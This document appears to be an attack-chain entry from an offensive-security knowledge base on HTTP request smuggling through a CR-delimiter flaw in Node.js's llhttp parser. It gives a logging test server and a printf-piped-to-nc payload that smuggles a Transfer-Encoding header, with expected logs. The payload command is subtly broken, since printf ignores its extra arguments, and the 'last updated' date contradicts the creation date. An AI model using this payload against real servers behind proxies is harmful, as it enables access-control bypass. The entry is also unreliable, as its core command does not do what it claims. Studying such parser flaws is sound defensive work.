---
tags:
  - http-request-smuggling
  - node-js
  - vulnerability
  - parser-exploit
type: attack_chain
tools:
  - '[[tools/Node-js]]'
  - '[[tools/printf]]'
  - '[[tools/nc]]'
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
commands:
  - '[[commands/node-run-server]]'
  - '[[commands/printf-nc-send-crafted-request]]'
platforms:
  - Node.js
  - Web
complexity: medium
procedures:
  - '[[procedures/Setup-Node-js-HTTP-Server-for-Vulnerability-Testing]]'
  - '[[procedures/Send-Crafted-HTTP-Request-for-Header-Smuggling]]'
  - '[[procedures/Verify-HTTP-Request-Smuggling-Exploitation]]'
step_count: 3
techniques:
  - '[[Exploit Public-Facing Application]]'
description: >-
  Multi-stage attack chain exploiting a vulnerability in Node.js's llhttp parser
  to perform HTTP Request Smuggling by using a single CR character as a header
  delimiter.
skill_level: intermediate
impact_level: high
id: de79766f-73c4-49c6-9ef1-a3d7624c9efa
created_at: '2025-12-13T09:01:17.677Z'
updated_at: '2025-12-13T09:01:17.677Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# HTTP Request Smuggling via CR Delimiter in Node.js llhttp Parser

Multi-stage attack chain demonstrating how to exploit a parsing vulnerability in Node.js's llhttp parser, allowing HTTP Request Smuggling by using a single CR as a header delimiter instead of the required CRLF, potentially bypassing access controls in proxy setups.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 3 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Setup Test Server] --> B[Send Crafted Request]
    B --> C[Verify Smuggling]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
```

## Prerequisites & Requirements

### Required Tools

- [[tools/Node-js]]
- [[tools/printf]]
- [[tools/nc]]

### Target Environment

- Node.js versions v16, v18, or v20
- HTTP server using the http module
- Localhost access on port 5000

### Initial Access Requirements

- Local machine access to run Node.js and send requests
- No credentials required for local testing
- Network position: Localhost

## Detailed Attack Procedures

### Step 1: Setup Node.js HTTP Server
procedure: [[procedures/Setup-Node-js-HTTP-Server-for-Vulnerability-Testing]]

**Objective**: Create a test environment to reproduce the llhttp parser vulnerability.

**Instructions**: Create a server.js file with the following content to log requests, headers, and body:

```javascript
// server.js content here (simple HTTP server that logs requests)
const http = require('http');
http.createServer((req, res) => {
  let body = '';
  req.on('data', chunk => { body += chunk; });
  req.on('end', () => {
    console.log('Headers:', req.headers);
    console.log('Body:', body);
    res.end('OK');
  });
}).listen(5000);
```

Then, start the server using [[commands/node-run-server]]:

```bash
node server.js
```

**Expected Output**: Server starts listening on port 5000 and is ready to receive requests.

**Success Indicators**:
- Server logs indicate it is listening
- No errors in startup

### Step 2: Send Crafted HTTP Request
procedure: [[procedures/Send-Crafted-HTTP-Request-for-Header-Smuggling]]

**Objective**: Exploit the parsing flaw by sending a request with a smuggled Transfer-Encoding header using CR as delimiter.

**Instructions**: Use [[commands/printf-nc-send-crafted-request]] to construct and send the malformed request:

```bash
printf "POST / HTTP/1.1\r\n" "Host: localhost:5000\r\n" "X-Abc:\rxTransfer-Encoding: chunked\r\n" "\r\n" "1\r\n" "A\r\n" "0\r\n" "\r\n" | nc localhost 5000
```

**Expected Output**: The request is sent successfully to the server.

**Success Indicators**:
- No connection errors
- Request payload is transmitted

### Step 3: Verify Exploitation
procedure: [[procedures/Verify-HTTP-Request-Smuggling-Exploitation]]

**Objective**: Confirm that the server misparses the headers and processes the smuggled content.

**Instructions**: Check the server logs for parsed headers showing { host: 'localhost:5000', 'x-abc': '', 'transfer-encoding': 'chunked' } and body 'A'.

**Expected Output**: Logs confirm header smuggling and chunked encoding applied.

**Success Indicators**:
- Smuggled header appears in logs
- Body is parsed as chunked

## Attack Chain Summary

### Key Achievements

1. Successful setup of vulnerable Node.js server
2. Exploitation via crafted request smuggling headers
3. Verification of misparsing leading to potential access control bypass

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Execution]]

*Last updated: 2023-10-01*
